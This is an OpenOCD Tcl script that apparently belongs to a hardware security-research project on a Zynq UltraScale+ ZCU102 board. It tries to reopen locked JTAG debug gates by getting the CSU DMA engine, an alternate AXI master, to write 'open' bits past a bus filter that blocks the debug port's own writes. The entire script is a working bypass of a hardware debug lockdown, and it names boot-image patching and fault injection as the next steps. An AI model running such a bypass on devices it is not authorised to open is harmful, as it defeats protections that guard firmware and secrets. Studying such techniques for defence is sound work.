# reopen-debug-csudma.tcl — Tier-1 "alternate AXI master" debug-gate reopen.
#
# reopen-debug.tcl writes the gate registers with the DAP's AXI-AP. If that write
# is blocked by the master-aware AXI filter (but the bits aren't eFuse-locked), a
# DIFFERENT bus master may still reach them. The CSU DMA engine (CSUDMA) — the same
# master the BootROM uses — is independent of the DAP. This script asks CSUDMA to
# write the gates: it stages the open values in OCM and runs a CSUDMA mem-to-mem
# copy into JTAG_SEC / JTAG_DAP_CFG (which are adjacent at 0xFFCA0038/0x003C), then
# DAP-reads the gates back as ground truth.
#
# Read-modify-write is preserved: it DAP-reads the current gate values, ORs in the
# open bits in software, and DMAs the OR'd words — so unrelated bits survive.
#
# NON-DESTRUCTIVE config (CSUDMA regs + two OCM scratch words). A baseline OCM->OCM
# copy runs first so a negative result is unambiguous (CSUDMA-from-DAP vs filter).
# RISK: a wedged DMA can stick the DAP; if reads go ERR en masse, power-cycle.
#
# Run: openocd -f openocd/zcu102.cfg -c "init; source openocd/reopen-debug-csudma.tcl; shutdown"

catch { targets uscale.axi } _
catch { uscale.dap dpreg 0 0x1e } _

# --- CSUDMA + SSS register map (from probe-csu-dma-rom.tcl; grounded in csudma.h) ---
set SRC_ADDR 0xFFC80000
set SRC_SIZE 0xFFC80004
set DST_ADDR 0xFFC80800
set DST_SIZE 0xFFC80804
set DST_STS  0xFFC80808
set SSS_CFG  0xFFCA0008
set SSS_DMA_LOOPBACK 0x50

# --- OCM scratch + the gate registers ---
set OCM_SRC 0xFFFC0100
set OCM_DST 0xFFFC0200
set JTAG_SEC     0xFFCA0038
set JTAG_DAP_CFG 0xFFCA003C
set SEC_OPEN 0x1FF
set DAP_OPEN 0xFF

proc rdi {addr} {
    if {[catch {read_memory $addr 32 1} r]} { catch { uscale.dap dpreg 0 0x1e } _ ; return -1 }
    return [expr {[lindex $r 0] & 0xFFFFFFFF}]
}
proc rdhex {addr} { set v [rdi $addr] ; if {$v < 0} { return "ERR" } ; return [format 0x%08X $v] }
proc wr {addr val} { catch { write_memory $addr 32 [list $val] } }

# CSUDMA mem-to-mem copy of $nwords words src->dst via SSS loopback. (probe-csu-dma-rom.tcl)
proc dma_copy {src dst nwords} {
    global SRC_ADDR SRC_SIZE DST_ADDR DST_SIZE DST_STS SSS_CFG SSS_DMA_LOOPBACK
    set szreg [expr {($nwords << 2) | 1}]
    wr $SSS_CFG $SSS_DMA_LOOPBACK
    wr $DST_ADDR $dst
    wr $DST_SIZE $szreg
    wr $SRC_ADDR $src
    wr $SRC_SIZE $szreg
    set i 0
    while {$i < 200} {
        set st [rdi $DST_STS]
        if {$st < 0} { return "blocked" }
        if {($st & 0x1) == 0} { return "done" }
        incr i
    }
    return "timeout"
}

puts ""
puts "================================================================"
puts " REOPEN DEBUG via CSUDMA  (alternate AXI master)"
puts "================================================================"

# ---- 0. reachability ----
puts ""
puts " CSUDMA DST_STS = [rdhex $DST_STS]   SSS_CFG(before) = [rdhex $SSS_CFG]"
puts "   (ERR here => CSUDMA not DAP-NS reachable in this state; the rest is moot.)"

# ---- 1. baseline OCM->OCM (proves CSUDMA works from the DAP + calibrates SIZE) ----
puts ""
puts " 1. baseline OCM->OCM copy (must PASS for the gate write below to be meaningful)"
wr $OCM_SRC 0xC0DE0001
wr [expr {$OCM_SRC + 4}] 0xC0DE0002
wr $OCM_DST 0x00000000
wr [expr {$OCM_DST + 4}] 0x00000000
set br [dma_copy $OCM_SRC $OCM_DST 2]
set b0 [rdi $OCM_DST]
set b1 [rdi [expr {$OCM_DST + 4}]]
set base_ok 0
if {$br eq "done" && $b0 == 0xC0DE0001 && $b1 == 0xC0DE0002} { set base_ok 1 }
puts "    copy=$br  dst=[rdhex $OCM_DST] [rdhex [expr {$OCM_DST + 4}]]"
if {$base_ok} {
    puts "    BASELINE PASS — CSUDMA mem-to-mem works from JTAG."
} else {
    puts "    BASELINE FAIL — CSUDMA not usable from DAP-NS here (gated, or SIZE/SSS wrong)."
    puts "    The gate-write result below is NOT trustworthy."
}
catch { uscale.dap dpreg 0 0x1e } _

# ---- 2. read gates, OR open bits, DMA the OR'd words into the gate registers ----
puts ""
puts " 2. CSUDMA write of the gates (read-modify-write; preserves unrelated bits)"
set sec0 [rdi $JTAG_SEC]
set dap0 [rdi $JTAG_DAP_CFG]
puts "    before:  JTAG_SEC=[rdhex $JTAG_SEC]  JTAG_DAP_CFG=[rdhex $JTAG_DAP_CFG]"
if {$sec0 < 0 || $dap0 < 0} {
    puts "    -> gate registers unreadable via DAP; cannot stage RMW. Aborting."
    wr $SSS_CFG 0x00000000
    puts "================================================================"
    return
}
set sec_new [expr {$sec0 | $SEC_OPEN}]
set dap_new [expr {$dap0 | $DAP_OPEN}]
# stage [sec_new, dap_new] contiguously; JTAG_SEC and JTAG_DAP_CFG are 4 bytes apart
wr $OCM_SRC $sec_new
wr [expr {$OCM_SRC + 4}] $dap_new
puts "    staging: [format 0x%08X $sec_new] [format 0x%08X $dap_new] -> DMA into 0xFFCA0038"
set wr_res [dma_copy $OCM_SRC $JTAG_SEC 2]
puts "    CSUDMA copy result: $wr_res"
catch { uscale.dap dpreg 0 0x1e } _

# ---- 3. verdict via DAP read-back ----
puts ""
puts " 3. DAP read-back (ground truth)"
set sec1 [rdi $JTAG_SEC]
set dap1 [rdi $JTAG_DAP_CFG]
puts "    after:   JTAG_SEC=[rdhex $JTAG_SEC]  JTAG_DAP_CFG=[rdhex $JTAG_DAP_CFG]"
set sec_open 0
if {$sec1 >= 0 && ($sec1 & 0x7) == 0x7} { set sec_open 1 }
set dap_open 0
if {$dap1 >= 0 && ($dap1 & 0xFF) == 0xFF} { set dap_open 1 }

puts ""
if {!$base_ok} {
    puts " VERDICT: INCONCLUSIVE — CSUDMA baseline failed, so the engine isn't usable"
    puts "   from DAP-NS in this state. Bring the board to a state where CSUDMA answers."
} elseif {$sec_open && $dap_open} {
    puts " VERDICT: REOPENED via CSUDMA — DAP_SEC + APU/RPU debug now read OPEN. The"
    puts "   alternate master reached the gates that the DAP-AP write could not."
} elseif {$sec_open || $dap_open} {
    puts " VERDICT: PARTIAL — CSUDMA opened one gate, not the other (eFuse-locked field"
    puts "   or the DMA write is also filtered for it)."
} else {
    puts " VERDICT: NOT REOPENED — CSUDMA write did not change the gates. The filter"
    puts "   covers CSUDMA too, or the bits are eFuse-locked. Escalate to Tier-2 (boot-"
    puts "   image patch) or Tier-4 (fault injection, docs/15)."
}

# restore SSS to idle
wr $SSS_CFG 0x00000000
puts "================================================================"
puts ""
